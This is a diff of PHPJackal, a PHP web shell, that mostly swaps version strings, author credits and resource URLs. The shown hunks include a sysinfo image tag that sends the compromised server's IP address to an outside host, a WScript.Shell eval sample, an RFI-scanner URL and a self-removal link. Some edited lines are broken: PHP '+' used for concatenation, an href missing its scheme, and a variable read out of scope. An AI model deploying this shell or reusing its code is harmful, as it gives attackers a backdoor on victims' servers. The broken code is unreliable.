@@ -1,6 +1,6 @@
 <?php
 /*
- * PHPJackal v3.1.1
+ * PHPJackal v3.1.0
  *
  * Nima Ghotbi
  *
@@ -52,11 +52,11 @@ $Required_Header_Value = '';
 # Resource_Dir
 # You can change it to mirror site or local directory(Should end
 # with "/")
-$Resource_Dir = "https://raw.githubusercontent.com/nim4/PHPJackal/master/resource/";
+$Resource_Dir = "https://cdn.rawgit.com/nim4/PHPJackal/master/resource/";
 
 # RFI_URL
 # Script to be used for checking RFI (Tools->Security scanner)
-$RFI_URL = "http://nimaghotbi.com/other/rfi.txt";
+$RFI_URL = $Resource_Dir + "rfi.txt";
 
 # Die_in_end
 # Call die() in the end of PHPJackal [true/false]
@@ -242,7 +242,7 @@ window.location = '" . hlinK () . "'
 			</ul>
 		</form>
 		<div id="footer">
-			<a href="http://nimaghotbi.com/">PHPJackal ' . $VERSION . '</a>
+			<a href="://github.com/nim4/PHPJackal">PHPJackal ' . $VERSION . '</a>
 		</div>
 	</div>
 </div>
@@ -416,7 +416,7 @@ $intro = '
 <font onmouseover="this.style.color=\'#FF0000\';" onmouseout="this.style.color=\'#484848\';" color="#484848">
 <pre>
 ' . $Banner [0] . '
-</pre></font>' . $Warning . '<br />Version: ' . $VERSION . '<br />Author: NetJackal (Nima Ghotbi)<br />Website: <a href="http://nimaghotbi.com/" target="_blank">http://nimaghotbi.com</a><br /><br /><br />
+</pre></font>' . $Warning . '<br />Version: ' . $VERSION . '<br />Author: Nima Ghotbi<br />Website: <a href="https://github.com/nim4/PHPJackal" target="_blank">https://github.com/nim4/PHPJackal</a><br /><br /><br />
 <noscript><h1 color="#FF0000">JavaScript is disabled in your browser!</h1> To use this script, JavaScript must be enabled in your browser.</noscript>
 <br />
 <br />New in this version:<br /><br />
@@ -1746,8 +1746,8 @@ function sysinfO() {
 	}
 	echo '<br /><br /><div class="fieldwrapper"><label class="styled" style="width:320px">Server information</label></div><div class="fieldwrapper"><label class="styled">Server:</label><div class="thefield"><span>';
 	if (! empty ( $_SERVER ['SERVER_ADDR'] ))
-		echo '<img src="http://nimaghotbi.com/other/PHPJackal/info/?ip=' . $_SERVER ['SERVER_ADDR'] . '" border="0" /> ';
-	echo '<a href="' . hlinK ( "seC=tools&serveR=whois.geektools.com&domaiN=" . $_SERVER ['HTTP_HOST'] ) . '">' . $_SERVER ['HTTP_HOST'] . '</a>';
+		echo '<img src="http://nima.my3gb.com/PHPJackal/info/?ip=' . $_SERVER ['SERVER_ADDR'] . '" border="0" /> ';
+	echo $_SERVER ['HTTP_HOST'];
 	if (! empty ( $_SERVER ['SERVER_ADDR'] )) {
 		echo '(<a href="' . hlinK ( "seC=tools&serveR=whois.geektools.com&domaiN=" . $_SERVER ['SERVER_ADDR'] ) . '">' . $_SERVER ['SERVER_ADDR'] . '</a>)';
 	}
@@ -3239,7 +3239,7 @@ function phpevaL() {
    $obj = new COM("WScript.Shell");
    $obj->Run("notepad", 9);
    sleep(2);
-   $obj->SendKeys("PHPJackal v$VERSION{ENTER}By NetJackal");
+   $obj->SendKeys("PHPJackal v$VERSION{ENTER}By Nima Ghotbi");
 }
 ';
 	echo '</textarea>
@@ -4010,11 +4010,11 @@ toggle();
 function phpjackal() {
 	global $VERSION, $cwd;
 	if (! empty ( $_REQUEST ['chkveR'] )) {
-		$res = getiT ( "http://nimaghotbi.com/other/PHPJackal/chkver.php?v=$VERSION", $headers);
+		$res = getiT ( $Resource_Dir . "chkver.txt", $headers);
 		if ($res)
-			echo $res;
+			if(trim($res) != $VERSION)echo 'New version available!'; else echo 'PHPJackal is already uptodate.';
 		else
-			echo 'Can not connect to server! Please check version manually from <a href="http://nima.cu.cc" target="_blank">http://nimaghotbi.com</a>';
+			echo 'Can not connect to server! Please check version manually from <a href="https://github.com/nim4/PHPJackal/" target="_blank">https://github.com/nim4/PHPJackal/</a>';
 	} else
 		echo '<ul><li><a href="' . hlinK ( "seC=phpjackal&workingdiR=$cwd&chkveR=1" ) . '">Check version</a></li><li><a href="#" onclick="if(confirm(\'Are you sure?\'))window.location=\'' . hlinK ( "seC=phpjackal&workingdiR=$cwd&slfrmv=1" ) . '\';">Self removal</a></li></ul>';
 }
@@ -4977,10 +4977,8 @@ if (! empty ( $_REQUEST ['seC'] )) {
 	echo $intro;
 ?>
 <div id="footer" style="margin-top: 100px; width: 850px">&copy;
-2012 <a href="http://nimaghotbi.com/"><strong>PHPJackal <?php
-	echo $VERSION;
-	?></strong></a><br />
-Created by NetJackal</div>
+2016 <a href="https://github.com/nim4/PHPJackal"><strong>PHPJackal <?= $VERSION; ?></strong></a><br />
+Created by Nima Ghotbi</div>
 </div>
 </div>
 </body>
@@ -4989,4 +4987,3 @@ Created by NetJackal</div>
 if ($Die_in_end)
 	die ( '<!-- Death -->' );
 ?>
-
